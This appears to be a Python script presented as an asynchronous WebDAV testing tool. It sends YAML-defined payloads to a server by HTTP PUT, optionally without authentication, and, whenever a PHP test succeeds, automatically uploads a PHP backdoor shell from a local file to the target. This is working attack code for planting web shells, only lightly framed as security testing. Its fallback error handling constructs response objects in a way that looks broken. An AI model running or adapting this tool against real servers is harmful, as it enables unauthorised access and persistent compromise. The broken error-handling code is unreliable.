import argparse
import asyncio
import json
import os
from dataclasses import asdict, dataclass
from datetime import datetime
from typing import Any, Dict, List, Optional

import aiohttp
import yaml

# A dataclass to represent a test case. Loaded from YAML files.
@dataclass
class Test:
    name: str
    content: str
    path: str
    is_php: bool = False
    severity: str = "Unknown"
    cve: str = "N/A"
    remediation: str = "N/A"

# A dataclass for the findings of a test. Includes timestamp for better reporting.
@dataclass
class Finding:
    test_name: str
    result: str
    payload_used: str
    timestamp: str
    backdoor_uploaded: Optional[str] = None
    severity: str = "Unknown"
    cve: str = "N/A"
    remediation: str = "N/A"

async def send_request(
    session: aiohttp.ClientSession,
    url: str,
    data: str,
    headers: Dict[str, str],
    use_auth: bool
) -> aiohttp.ClientResponse:
    """Sends an asynchronous HTTP PUT request."""
    request_headers = headers.copy()
    if not use_auth:
        request_headers.pop('Authorization', None)
        print(f"Sending PUT request to {url} without authentication.")
    else:
        print(f"Sending PUT request to {url} with authentication.")

    try:
        # The 'data' needs to be bytes for aiohttp
        response = await session.put(
            url,
            data=data.encode('utf-8'),
            headers=request_headers,
            timeout=15
        )
        await response.text() # Consume the response to release the connection
        return response
    except aiohttp.ClientConnectorError as e:
        print(f"Connection error for {url}: {e}")
        # Create a mock response for offline/connection error handling
        return aiohttp.ClientResponse(method='PUT', url=url, writer=None, continue100=None, timer=None,
                                      request_info=None, traces=[], loop=asyncio.get_event_loop(),
                                      session=session, status=0, reason=str(e))
    except asyncio.TimeoutError:
        print(f"Request to {url} timed out.")
        return aiohttp.ClientResponse(method='PUT', url=url, writer=None, continue100=None, timer=None,
                                      request_info=None, traces=[], loop=asyncio.get_event_loop(),
                                      session=session, status=408, reason="Request Timeout")


async def handle_php_shell_upload(
    session: aiohttp.ClientSession,
    base_url: str,
    headers: Dict[str, str],
    use_auth: bool,
    finding: Finding
) -> None:
    """Attempts to upload a PHP shell if a PHP-related test succeeds."""
    php_shell_path = "backdoors/php_shell.php"
    target_shell_name = "php_shell_uploaded.php"
    target_upload_url = f"{base_url}/{target_shell_name}"

    try:
        with open(php_shell_path, 'r') as f:
            php_shell_content = f.read()

        print(f"Attempting to upload {php_shell_path} to {target_upload_url}...")
        upload_response = await send_request(session, target_upload_url, php_shell_content, headers, use_auth)

        if upload_response.status in [200, 201, 204]:
            finding.backdoor_uploaded = target_upload_url
            finding.severity = "Critical"
            finding.remediation = "PHP execution possible, and a backdoor was successfully uploaded. Review file upload capabilities and script execution permissions immediately."
            print(f"Successfully uploaded {target_shell_name}.")
        else:
            finding.backdoor_uploaded = f"Failed with code {upload_response.status}"
            print(f"Failed to upload {target_shell_name}. Status: {upload_response.status}")

    except FileNotFoundError:
        error_msg = f"Error: {php_shell_path} not found. Cannot auto-upload."
        print(error_msg)
        finding.backdoor_uploaded = error_msg
    except Exception as e:
        error_msg = f"An error occurred during PHP shell upload: {e}"
        print(error_msg)
        finding.backdoor_uploaded = error_msg


async def run_test(
    session: aiohttp.ClientSession,
    base_url: str,
    headers: Dict[str, str],
    use_auth: bool,
    test: Test
) -> Finding:
    """Runs a single, generic test case and returns a Finding."""
    print(f"\nRunning test: {test.name}")
    target_url = f"{base_url}/{test.name}"
    response = await send_request(session, target_url, test.content, headers, use_auth)
    test_succeeded = response.status in [200, 201, 204]

    finding = Finding(
        test_name=test.name,
        result=f"Execution {'Succeeded' if test_succeeded else 'Failed'} (status: {response.status}, reason: {response.reason})",
        payload_used=test.content[:100] + "..." if len(test.content) > 100 else test.content,
        timestamp=datetime.utcnow().isoformat(),
        severity=test.severity,
        cve=test.cve,
        remediation=test.remediation
    )

    if test_succeeded:
        print(f"Test {test.path} succeeded.")
        if test.is_php:
            await handle_php_shell_upload(session, base_url, headers, use_auth, finding)
    else:
        print(f"Test {test.path} failed or was skipped.")

    return finding


def load_tests_from_file(filepath: str) -> List[Test]:
    """Loads a list of Test objects from a given YAML file."""
    print(f"Loading tests from {filepath}...")
    try:
        with open(filepath, 'r') as f:
            tests_data = yaml.safe_load(f)
            if not tests_data:
                return []
            return [Test(path=filepath, **data) for data in tests_data]
    except FileNotFoundError:
        print(f"Warning: Test file not found: {filepath}")
        return []
    except Exception as e:
        print(f"Error loading or parsing {filepath}: {e}")
        return []


async def main():
    """Main asynchronous function to parse arguments and run tests concurrently."""
    parser = argparse.ArgumentParser(
        description="An asynchronous WebDAV testing tool.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("url", help="URL of the DAV server")
    parser.add_argument(
        "--test-files",
        nargs='+',
        help="One or more paths to YAML test files.",
        default=[]
    )
    parser.add_argument(
        "--test-dirs",
        nargs='+',
        help="One or more directories to scan for .yaml or .yml test files.",
        default=[]
    )
    parser.add_argument(
        "--test-auth-bypass",
        action="store_true",
        help="Run tests without sending the Authorization header."
    )

    args = parser.parse_args()
    all_tests: List[Test] = []
    headers = {"Authorization": "Basic dXNlcjpwYXNz"}  # Example auth header

    # Load tests from specified files
    for f in args.test_files:
        all_tests.extend(load_tests_from_file(f))

    # Discover and load tests from specified directories
    for d in args.test_dirs:
        if not os.path.isdir(d):
            print(f"Warning: Test directory not found: {d}")
            continue
        for filename in os.listdir(d):
            if filename.endswith((".yaml", ".yml")):
                filepath = os.path.join(d, filename)
                all_tests.extend(load_tests_from_file(filepath))

    if not all_tests:
        print("No tests loaded. Please specify test files or directories. Exiting.")
        return

    print(f"\n--- Starting Test Run on {args.url} ---")
    use_auth = not args.test_auth_bypass
    all_findings: List[Finding] = []

    # The main async execution block
    async with aiohttp.ClientSession() as session:
        tasks = [
            run_test(session, args.url, headers, use_auth, test)
            for test in all_tests
        ]
        # Gather will run all test tasks concurrently
        results = await asyncio.gather(*tasks)
        all_findings.extend(results)

    if all_findings:
        print("\n--- Test Summary (JSON) ---")
        findings_dict = [asdict(finding) for finding in all_findings]
        print(json.dumps(findings_dict, indent=4))

if __name__ == "__main__":
    # In Python 3.7+ you can simply use asyncio.run(main())
    asyncio.run(main())
